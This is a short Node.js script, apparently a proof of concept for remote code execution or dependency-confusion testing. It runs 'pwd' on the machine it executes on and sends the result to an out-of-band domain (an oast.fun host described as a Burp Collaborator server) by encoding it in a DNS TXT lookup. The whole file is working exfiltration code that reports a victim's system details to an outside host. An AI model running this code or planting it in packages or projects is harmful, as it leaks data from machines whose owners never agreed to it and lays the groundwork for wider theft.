const { exec } = require('child_process');
const dns = require('dns');

// Replace with your Burp Collaborator server address
const collaboratorServer = 'cjg2e0r2vtc0000xj9s0gjeb8yoyyyyyb.oast.fun';

exec('pwd', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }

  const pwdResult = stdout.trim();

  // Perform DNS lookup to send data to Burp Collaborator
  dns.resolveTxt(`${pwdResult}.${collaboratorServer}`, (err, addresses) => {
    if (err) {
      console.error(`DNS lookup error: ${err}`);
      return;
    }

    console.log(`Sent pwd result to Burp Collaborator: ${pwdResult}`);
  });
});
